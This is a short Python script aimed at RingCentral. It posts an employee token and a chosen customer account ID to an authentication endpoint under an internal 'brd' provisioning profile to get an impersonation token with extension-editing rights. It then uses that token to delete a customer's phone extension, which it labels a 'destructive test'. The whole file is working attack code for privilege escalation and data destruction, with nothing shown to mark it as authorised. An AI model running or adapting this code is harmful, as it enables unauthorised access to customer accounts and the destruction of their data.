import requests
import os

def get_impersonation_token(employee_token, target_account_id):
    """
    Exchanges Employee token for Customer-scoped token.
    Uses the 'brd' profile which we know grants EditExtensions.
    """
    exchange_url = "https://auth.ps.ringcentral.com/jwks"
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "access_token": employee_token  
    }
    # Using 'brd' as it is a whitelisted internal provisioning tool
    payload = {"accountId": str(target_account_id), "appName": "brd"}

    print(f"--- BRIDGE ATTEMPT: Target='{target_account_id}' Profile='brd' ---")
    try:
        response = requests.post(exchange_url, json=payload, headers=headers)
        if response.ok:
            data = response.json()
            print(f"--- BRIDGE SUCCESS: OWNER={data.get('owner_id')} ---")
            print(f"--- GRANTED SCOPES: {data.get('scope')} ---")
            return data.get("access_token")
        else:
            print(f"--- BRIDGE FAILED: {response.status_code} {response.text} ---")
            return None
    except Exception as e:
        print(f"--- BRIDGE EXCEPTION: {str(e)} ---")
        return None

class RCOperabilityTest:
    def __init__(self, token):
        self.token = token
        self.base_url = "https://platform.ringcentral.com"

    def delete_extension(self, extension_id):
        """
        DESTRUCTIVE TEST: Deletes a specific extension.
        API: DELETE /restapi/v1.0/account/~/extension/{extensionId}
        """
        # Using '~' for the account ID relies on the token's active impersonation context
        url = f"{self.base_url}/restapi/v1.0/account/~/extension/{extension_id}"
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Accept": "application/json"
        }
        
        print(f"--- EXECUTING DELETE: Ext={extension_id} ---")
        response = requests.delete(url, headers=headers)
        
        # A successful DELETE usually returns 204 No Content (empty body)
        try:
            body = response.json()
        except:
            body = {"info": "No JSON body returned"}
            if response.text:
                body["raw_text"] = response.text
            
        return {
            "status_code": response.status_code,
            "api_response": body,
            "url_attempted": url
        }
